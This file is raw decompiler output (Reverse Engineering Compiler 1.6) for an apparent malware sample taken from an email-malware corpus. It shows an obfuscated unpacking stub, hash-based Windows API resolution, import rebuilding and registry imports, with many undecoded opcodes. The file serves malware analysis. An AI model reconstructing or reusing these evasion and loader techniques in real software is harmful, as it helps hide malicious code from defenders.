/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1526/ia32_pe/subject.exe'
 */

/*	Procedure: 0x0040100B - 0x0040102E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040100B()
{



    ah = ah + dl;
    *eax = *eax + al;
    *eax = *eax + -1392485376;
    *%ss:eax+0x9d00d3] = *%ss:eax+0x9d00d3] + ch;
    asm("Unknown opcode 0x82");
    *(ebp + -1113719652) = *(ebp + -1113719652) + bh;
    *eax = *eax + eax - 1;
    asm("pushf");
    asm("popf");
    *esp = *esp + ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040102F - 0x0040106D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040102F()
{



    al = *esi;
    esi = esi + 1;
    *(ecx + 0x401020) = *(ecx + 0x401020) + bl;
    *eax = *eax + al;
    *eax = *eax + al;
    eax = eax ^ 5373952;
    *eax = *eax + al;
    *(esi + ebx + -210698206) = *(esi + ebx + -210698206) + bh;
    *(al & 241) = *(al & 241) + (al & 241);
    asm("scasd");
    *(ecx + ecx * 4) = *(ecx + ecx * 4) + dl;
    asm("fidivr word [edi+0x400000]");
    asm("pushf");
    asm("clc");
    asm("popf");
    ecx = 155648;
    asm("rep movsb");
    (save)4260640;
    asm("pushf");
    asm("cmc");
    asm("popf");
    eax = 0;
    asm("pushf");
    asm("wait");
    asm("popf");
}

/*	Procedure: 0x0040106E - 0x00401089
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040106E()
{



    asm("sbb dh,cl");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + dh;
    *eax = *eax + al;
    *eax = *eax + al;
    edi = edi & ebp;
    asm("in eax,dx");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    (restore)esi;
    *(eax + 1259554576) = *(eax + 1259554576) + ch;
}

/* DEST BLOCK NOT FOUND: 004013af -> 00401454 */
/*	Procedure: 0x0040108A - 0x00401420
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    edx = edx - 1;
    edi = -1777;
    asm("ror edi,0x4");
    esi = esi + edi;
    edx = 90175673;
    asm("rol edx,0x4");
    ecx = ecx ^ ebx;
    esi = esp;
    ecx = -536870881;
    asm("rol ecx,0x3");
    eax = eax + 1;
    esi = esi & ecx;
    ecx = 19918848;
    asm("ror ecx,0x4");
    ecx = ecx + esi;
    dx = dx - 51;
    eax = *ecx;
    ecx = ecx & ebx;
L004010be:
    eax = eax - 1;
    esi = esi >> 6;
    if(*%ss:eax] != edi) {
        ecx = ecx + ebx;
        if(*%ss:eax] != edx) {
            goto L004010be;
        }
        eax = eax - 1;
        ecx = 536870913;
        asm("rol ecx,0x7");
        while(*eax != cl) {
        }
        si = si | 68;
    } else {
        edi = eax;
        edx = 1020;
        asm("ror edx,0x2");
        edi = edi + 4;
        for(esi = esi + *esp; *edi != dl; ecx = ecx - 1) {
        }
    }
    edi = edi + esi;
    edx = esp;
    ax = ax - -85;
    esi = *edx;
    asm("ror ecx,0x7");
    edi = esi;
L0040110a:
    edi = edi + 1;
    esi = 12480;
    asm("ror esi,0x6");
    edx = edx - edi;
    if(*%ss:edi] != esi) {
        goto L0040110a;
    }
    asm("Unknown opcode 0xc1");
    *esi = !( *esi);
    eax = *edi();
    esi = esi + ebp;
    dx = dx - 93;
    ecx = ecx >> 8;
    eax = *%fs:edi] + 12;
    edx = *eax;
    edi = -10;
    eax = 28;
    esi = 24;
    edx = edx + 28;
    asm("ror di,0x7");
    esi = *edx;
    asm("ror eax,0xb");
    edi = *esi;
    edx = edx & 601155946;
    ecx = *(edi + 8);
    eax = ~eax;
    esi = esi + 1922935955;
    edx = edx | 747102318;
    eax = L00401478(ecx, 1145289687);
    esi = 1610612739;
    asm("rol esi,0x5");
    ecx = ecx | 1789077269;
    eax = 909252406;
    asm("rol eax,0x1");
    (save)esi;
    si = si - 71;
    (save)eax;
    asm("ror eax,0xf");
    edx = 1663279987;
    asm("ror edx,0x3");
    (save)edx;
    esi = esi - 1;
    (save)esp;
    eax = *edi();
    esp = esp - -12;
    edx = edx & -8509338;
    eax = L00401478(eax, -661327863);
    eax = edi;
    (save)0;
    esi = 0;
    (save)0;
    edx = 0;
    (save)0;
    (save)12646967;
    (save)1118437288;
L004011de:
    (save)3157;
    eax = *eax();
    edi = edi | 303890526;
    eax = 3157;
    edx = edx ^ ebp;
    ds = 3157;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf6");
    asm("Unknown opcode 0x0f");
    ecx = 576905;
    edx = edx & -914171159;
    edi = *L0008CD89;
    asm("rol esi,0x12");
    eax = *edi();
    goto L004011de;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    eax = 35;
    asm("rol cx,0x9");
    ds = eax;
    ecx = ecx + esi;
    esi = 0;
    eax = *%fs:edx];
    edi = edi | 1724618709;
    esi = *(eax + 12);
    edx = 32;
    ecx = *(esi + 28);
    si = si - 41;
    edx = *ecx;
    esi = esi & 40028214;
    ecx = ecx >> 7;
    edx = edx + 8;
    edi = *edx;
    eax = -1901300141;
    esi = ~esi;
    ebp = edi;
    eax = L00401478(edi, -570912687);
    (save)156128;
    (save)64;
    eax = *edi();
    ebx = eax;
    asm("wait");
    *(eax - -155658) = ebp;
    asm("wait");
    L00401478(ebp, 1145289687);
    *(ebx + 155668) = edi;
    L00401478(ebp, -1459172001);
    esi = ebx + 155681;
    *esi = edi;
    eax = L00401478(ebp, -201604311);
    ecx = esp;
    asm("stc");
    (save)ecx - 113;
    edx = 64;
    (save)64;
    esi = 4194304;
    edx = *L0040003C + 4194304;
    esi = *(edx + 80);
    (save)esi;
    (save)4194304;
    eax = *edi();
    asm("wait");
    asm("pushf");
    asm("stc");
    asm("popf");
    eax = 0x401074;
    esi = *L00401074;
    edx = 0;
    ecx = 48492;
    eax = 4194598 + esi;
    asm("pushf");
    asm("wait");
    asm("popf");
    dl = *eax;
    asm("pushf");
    asm("clc");
    asm("popf");
    if(edx != 0) {
        asm("pushf");
        asm("clc");
        asm("popf");
        if((dl ^ 150) != 0) {
            *eax = dl;
        }
        asm("pushf");
        asm("cld");
        asm("popf");
    }
    asm("pushf");
    asm("clc");
    asm("popf");
    eax = eax + 1;
    asm("loop 0x4012f8");
    asm("fnop");
    asm("pusha");
    asm("cld");
    edi = ebx;
    eax = 0x401074;
    asm("fnop");
    asm("wait");
    esi = *eax + 4194598;
    asm("cld");
    asm("wait");
    dl = 128;
    asm("fnop");
    asm("wait");
    ebx = 0;
L0040133c:
    *edi = *esi;
    edi = edi + 1;
    asm("pushf");
    asm("cld");
    asm("popf");
    bl = 2;
L00401342:
    L00401421();
    if(esi = esi + 1) {
        goto L0040133c;
    }
    ecx = 0;
    eax = L00401421();
    >= ? L00401394 : ;
    eax = 0;
    eax = L00401421();
    >= ? L004013ab : ;
    bl = 2;
    asm("pushf");
    asm("stc");
    asm("popf");
    asm("pushf");
    asm("stc");
    asm("popf");
    al = 16;
L00401372:
    eax = L00401421();
    asm("adc al,al");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L00401372;
    }
    asm("fnop");
    asm("wait");
    != ? 0x40140b : ;
    *edi = al;
    edi = edi + 1;
    asm("wait");
    goto L00401342;
    eax = L0040143A();
    if(!(ecx = ecx - ebx)) {
        L00401435();
        goto L00401404;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L00401454;
        }
        asm("pushf");
        asm("clc");
        asm("popf");
        asm("adc ecx,ecx");
    } else {
        asm("xchg ecx,eax");
        asm("pushf");
        asm("clc");
        asm("popf");
        eax = eax - 1;
        asm("pushf");
        asm("popf");
        eax = eax << 8;
        al = *esi;
        esi = esi + 1;
        eax = L00401435();
        asm("pushf");
        asm("wait");
        asm("popf");
        if(eax < 32000) {
            asm("pushf");
            asm("wait");
            asm("popf");
            if(ah >= 5) {
                goto L004013fc;
            }
            asm("pushf");
            asm("stc");
            asm("popf");
            if(eax > 127) {
                goto L00401400;
            }
        }
    }
    ecx = ecx + 1;
L004013fc:
    asm("pushf");
    asm("wait");
    asm("popf");
    ecx = ecx + 1;
L00401400:
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("xchg eax,ebp");
L00401404:
    asm("pushf");
    asm("popf");
    eax = ebp;
    bl = 1;
    (save)esi;
    esi = edi;
    asm("pushf");
    asm("cld");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    asm("pushf");
    asm("clc");
    asm("popf");
    (restore)esi;
    asm("pushf");
    asm("popf");
    goto L00401342;
}

/* DEST BLOCK NOT FOUND: 00401426 -> 00401434 */
/*	Procedure: 0x00401421 - 0x00401434
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401421()
{



    asm("pushf");
    asm("clc");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        asm("pushf");
        asm("wait");
        asm("popf");
        esi = esi + 1;
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x00401435 - 0x00401439
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401435()
{



    asm("pushf");
    asm("clc");
    asm("popf");
    ecx = 0;
}

stack space not deallocated on return
/*	Procedure: 0x0040143A - 0x00401477
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040143A()
{



    asm("pushf");
    asm("clc");
    asm("popf");
    do {
        L00401421();
        asm("pushf");
        asm("cmc");
        asm("popf");
        asm("adc ecx,ecx");
        eax = L00401421();
    } while(ecx = ecx + 1);
    return;
    asm("pushf");
    asm("cmc");
    asm("popf");
    asm("popa");
    asm("pushf");
    asm("cmc");
    asm("popf");
    eax = L00401541();
    esi = 0x40104f;
    (save)155648 + ebx;
    asm("stc");
    ecx = 31;
    asm("cmc");
    asm("rep movsb");
    asm("cmc");
}

/*	Procedure: 0x00401478 - 0x00401540
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401478(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    asm("cld");
    eax = A4;
    A8 = eax;
    asm("cmc");
    eax = eax + 34;
    asm("clc");
    eax = eax - -26;
    edx = *eax;
    ecx = A8 - -7;
    asm("wait");
    ecx = ecx + 113;
    asm("stc");
    ecx = ecx + edx;
    asm("wait");
    edx = *ecx + 1;
    asm("cmc");
    edx = edx - -27;
    asm("clc");
    edx = edx + A8;
    asm("clc");
    ecx = edx;
    edi = *ecx + A8;
    asm("clc");
    ecx = ecx - -4;
    (save) *ecx;
    asm("cld");
    (restore)edx;
    asm("cmc");
    edx = edx + A8;
    ecx = ecx - -4;
    asm("cld");
    eax = *ecx + A8;
    asm("cmc");
    (save)eax;
    (save)edi;
    edi = edx;
    asm("cmc");
    edx = 0;
    (save)0;
    eax = A4;
    ecx = eax;
    asm("stc");
    eax = eax + *edi;
    edx = 0;
    for(asm("wait");; 1; asm("wait");) {
        dl = dl + *eax;
        asm("clc");
        eax = eax + 1;
        asm("cmc");
        asm("ror edx,0x1d");
        asm("stc");
        edx = edx ^ -1611690945;
        asm("wait");
        if(*eax != 0) {
            continue;
        }
        if((edx ^ A8) == 0) {
            break;
        }
        (restore)edx;
        edx = edx + 1;
        asm("wait");
        (save)edx;
        eax = *(edi + 4);
        asm("cmc");
        eax = eax + ecx;
        asm("clc");
        edx = 0;
    }
    (restore)A8;
    asm("cmc");
    eax = Vfffffffc + (A8 << 1);
    edx = *eax & 65535;
    asm("cmc");
    edx = edx << 2;
    (restore)eax;
    asm("stc");
    (save)eax;
    eax = eax + edx;
    (restore)A8;
    asm("cld");
    edi = *eax;
    (restore)A8;
    asm("cmc");
    edi = edi + ecx;
}

/*	Procedure: 0x00401541 - 0x00401678
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401541()
{



    asm("pusha");
    ecx = 78656;
    edx = ebx;
    asm("clc");
    ecx = ecx + edx;
    asm("clc");
    *(ebx + 155707) = edx;
    for(asm("stc");; 1; asm("cld");) {
        edi = *(ecx + 12);
        if(edi == 0) {
            break;
        }
        (save)ecx;
        (save)edi;
        edi = ecx + 16;
        asm("cmc");
        eax = *edi;
        asm("clc");
        *(ebx - -155734) = eax;
        esi = *ecx;
        *(ebx - -155721) = esi;
        if(esi == 0) {
            esi = *(ecx + 16);
        }
        edx = *(ebx + 155707);
        *esp = *esp + edx;
        (restore)edi;
        esi = esi + edx;
        asm("wait");
        *(ebx + 155744) = esi;
        (save)esi;
        (save)edi;
        eax = *(ebx - -155668);
        asm("wait");
        eax = *eax();
        for(*(ebx - -155768) = eax; 1; *(ebx + 155744) = edx) {
            eax = *( *(ebx + 155744));
            asm("stc");
            if(eax == 0) {
                break;
            }
            ecx = 1867014677;
            asm("stc");
            if(!(eax & (ecx ^ -280468971))) {
                asm("cmc");
                if(!(eax = eax - -2)) {
                    goto L004015ee;
                }
                asm("cld");
                eax = eax + *(ebx + 155707);
            } else {
L004015ee:
                ecx = 2147483647;
                asm("clc");
                eax = eax & ecx;
            }
            (save)eax;
            (save) *(ebx - -155768);
            asm("clc");
            edi = *(ebx - -155681);
            asm("stc");
            eax = *edi();
            edx = *(ebx - -155734);
            *(edx + *(ebx + 155707)) = eax;
            edx = *(ebx - -155734);
            asm("wait");
            edx = edx + 4;
            *(ebx + 155734) = edx;
            asm("cmc");
            edx = *(ebx + 155744);
            asm("cmc");
            edx = edx + 4;
        }
        asm("clc");
        esp = esp + 4;
        (restore)ecx;
        ecx = ecx + 20;
    }
    asm("popa");
}

/*	Procedure: 0x00401679 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401679()
{



}

/* address  size  */
/* 0x0040108a       0 */ /* unknown */ void 	__entry_point__;
/* 0x00403000       0 */ /* unknown */ void 	__imp__RegOpenKeyA;
/* 0x00403004       0 */ /* unknown */ void 	__imp__RegQueryValueW;
/* 0x00403008       0 */ /* unknown */ void 	__imp__RegCreateKeyA;
/* 0x0040300c       0 */ /* unknown */ void 	__imp__RegQueryValueExA;
/* 0x00403010       0 */ /* unknown */ void 	__imp__RegQueryValueExW;
/* 0x00403014       0 */ /* unknown */ void 	__imp__RegCreateKeyExW;
/* 0x00403018       0 */ /* unknown */ void 	__imp__RegOpenKeyExA;
/* 0x0040301c       0 */ /* unknown */ void 	__imp__RegEnumKeyW;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
